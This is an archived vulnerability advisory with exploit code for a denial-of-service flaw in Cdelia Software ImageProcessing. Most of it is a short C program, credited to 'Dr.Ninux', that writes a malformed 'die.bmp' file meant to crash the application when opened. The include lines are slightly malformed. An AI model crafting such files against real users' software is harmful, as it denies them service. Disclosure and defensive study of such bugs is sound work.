source: http://www.securityfocus.com/bid/23629/info

Cdelia Software ImageProcessing is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users. 

 **********************************
 ## Exploit Coded By Dr.Ninux ##
 ##       www.LeZr.com        ##
 ##  LeZr.com Security Team   ##
 ##    Dr.Ninux@bsdmail.org   ##
 **********************************
 ## 24 April 2007 , Tuesday
 ## This exploit will create an image (bmp)
 ## try to open it with "ImageProcessing" from Cdelia Software co.
 ## then the program will be die...!
 **********************************
 ##
 ## grEEts to:
 ## Dr.Virus9,Qptan(Linux_Drox),Q8trojan,BataWeel,SAUDI,RoDhEDoR,
 ## Arab4services.com,The_DoN,aseer-alnjoom,Maxy,hacaar...AND milw0rm.com
 ##
 */
 #include <stdio.h
 #include <stdlib.h

 #define INV_PIC "die.bmp"

 int main()
 {

       int i=0;
       char inv_[]="LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL";
       FILE* inv_pic;

       printf("\t\t**********************************\n");
    printf("\t\t  ## Exploit Coded By Dr.Ninux ##\n");
    printf("\t\t  ##       www.LeZr.com        ##\n");
    printf("\t\t  ##  LeZr.com Security Team   ##\n");
    printf("\t\t  ##    Dr.Ninux@bsdmail.org   ##\n");
    printf("\t\t**********************************\n");
    printf("\n");

       if((inv_pic=fopen(INV_PIC,"wb"))==NULL)
       {
               printf("error:foepn().\n");
               exit(0);
       }

       printf("[+]Creating |invalid picture| ... plz wait.\n");

       for(i=0;i<sizeof(inv_);i++)
       {
               fputc(inv_[i],inv_pic);
       }

       fclose(inv_pic);
       printf("[+]BMP File %s Successfuly Created...\n",INV_PIC);

       return 0;
 }